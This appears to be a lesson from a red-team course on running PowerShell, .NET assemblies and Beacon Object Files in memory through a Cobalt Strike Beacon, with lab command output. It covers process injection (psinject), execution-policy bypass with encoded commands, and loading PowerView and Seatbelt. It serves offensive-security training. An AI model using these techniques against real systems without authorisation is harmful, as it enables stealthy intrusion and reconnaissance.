There are countless commercial and open source tooling that are useful to leverage during an engagement. Some notable examples include Seatbelt for local reconnaissance, PowerView for domain reconnaissance, Certipy & Certify for ADCS abuse, Rubeus for Kerberos abuse, and Impacket for lateral movement, credential dumping & relaying.  Some tools will need to be executed directly on a target and some can operate over a network.  This lesson will focus on the former.  

Beacon provides means to execute PowerShell scripts, .NET assemblies, and reflective DLLs, all in-memory to give as much flexibility as possible to the operator.

## powershell

There are three ways to execute PowerShell in Beacon. The first is with the `powershell` command.

```powershell
beacon> help powershell
Use: powershell [commandlet] [arguments]

Execute the command using powershell. Any cmdlets from the
last use of powershell-import are available here too.
```

This uses powershell.exe which makes it roughly equivalent to the `shell` command (which uses cmd.exe).

```powershell
beacon> powershell $env:computername
LON-WKSTN-1
```

The cmdlet and arguments that you specify are converted into an encoded command before execution.  So the command above is actually executed as: `powershell -nop -exec bypass -EncodedCommand JABlAG4AdgA6AGMAbwBtAHAAdQB0AGUAcgBuAGEAbQBlAA==`.  Operators can modify this behaviour using hooks in Aggressor script.

## powerpick

```powershell
beacon> help powerpick
Use: powerpick [commandlet] [arguments]
     powerpick "[PATCHES: [patch-rule] [patch-rule] [patch-rule] [patch-rule]]" [commandlet] [arguments]

Execute the command using Unmanaged PowerShell. Any cmdlets from the
last use of powershell-import are available here too.
```

This command uses an instance of unmanaged PowerShell, which taps into the underlying PowerShell APIs without relying on powershell.exe.  This is based on Lee Christensen's [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) project.  This is a fork and run command which starts Beacon's spawnto process, injects the unmanaged PowerShell DLL into it, and reads the output over a named pipe.

``` powershell
beacon> powerpick $env:computername
LON-WKSTN-1
```

## PsInject

```powershell
beacon> help psinject
Use: psinject [pid] [arch] [commandlet] [arguments]

Inject Unmanaged PowerShell into a specific process and execute the
specified command. Any cmdlets from the last use of powershell-import are 
available here too.
```

This works in the same way as `powerpick`, but allows operators to inject the unmanaged DLL into an existing process rather than spawning a new one.  This can be useful for running PowerShell scripts in the context of another user, assuming you have the privileges to inject into their processes.

```powershell
beacon> psinject 3020 x64 $PID
[*] Tasked beacon to psinject: $PID into 3020 (x64)

3020
```

## Importing PowerShell Scripts

To execute external PowerShell scripts, they must first be imported using the `powershell-import` command.

```powershell
beacon> help powershell-import
Use: powershell-import [/path/to/local/script.ps1]

Import a powershell script which is combined with future
calls to the powershell command. You may only use one
imported script at a time.
```

For example, to import PowerView, we would do:

```powershell
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
```

> This is the local path on the machine running the Cobalt Strike client, **not** the target the Beacon is running on.

The content of the imported script is automatically imported into the PowerShell session when running `powershell`, `powerpick`, and `psinject`.  Beacon does this by hosting the script on a small built-in webserver, which is then fetched and imported during execution.

```powershell
beacon> powerpick Get-Domain

Forest                  : contoso.com
DomainControllers       : {lon-dc-1.contoso.com}
<SNIP>
```

> Beacon can only hold one imported script at a time.

## .NET

The `execute-assembly` command uses a reflective DLL to load and host the CLR (Command Language Runtime), and then executes a .NET assembly from memory.  Only .NET Framework assemblies are supported (i.e. no .NET/.NET Core).

```powershell
beacon> help execute-assembly
Use: execute-assembly [/path/to/file.exe] [arguments]
Use: execute-assembly "[PATCHES: [patch-rule] [patch-rule] [patch-rule] [patch-rule]]" [/path/to/file.exe] [arguments]

Executes a local .NET process assembly on target. This command loads the CLR in a temporary
process and loads the assembly into it. If the assembly is in the data store, this command will
use the loaded item automatically. For more information (help data-store).

beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe AntiVirus

====== AntiVirus ======

  Engine                         : Windows Defender
  ProductEXE                     : windowsdefender://
  ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe

[*] Completed collection in 0.181 seconds
```

## BOFs

BOFs are tiny object files that can be loaded and executed by Beacon and can be executed using the `inline-execute` command.

```powershell
beacon> help inline-execute
Use: inline-execute [/path/to/file.o] [args]

Run a Beacon Object File in this Beacon session. A Beacon Object File is a 
C program, compiled as an object file, written to use conventions specified 
in the Cobalt Strike documentation. If the Beacon Object File is in the data
store, this command will use the loaded item automatically. For more
information (help data-store).
```

However, it's more common for BOF tooling to be wrapped in their own command aliases.  For example, TrustedSec's [Situational Awareness BOF project](https://github.com/trustedsec/CS-Situational-Awareness-BOF) contains multiple BOFs that are exposed via custom commands via the included Aggressor script.

For example, its `ipconfig` command acts as a replacement for running `shell ipconfig`.

```powershell
beacon> ipconfig

{8566281E-2B05-48AC-9D59-F18E427FCAB6}
	Ethernet
	Microsoft Hyper-V Network Adapter
	02-15-5D-10-BD-E0
	10.10.120.112
Hostname: 	lon-wkstn-1
DNS Suffix: 	contoso.com
DNS Server: 	10.10.120.1
```

Under the hood, the Aggressor script is running `beacon_inline_execute($1, readbof($1, "ipconfig", $null, "T1016"), "go", $null);`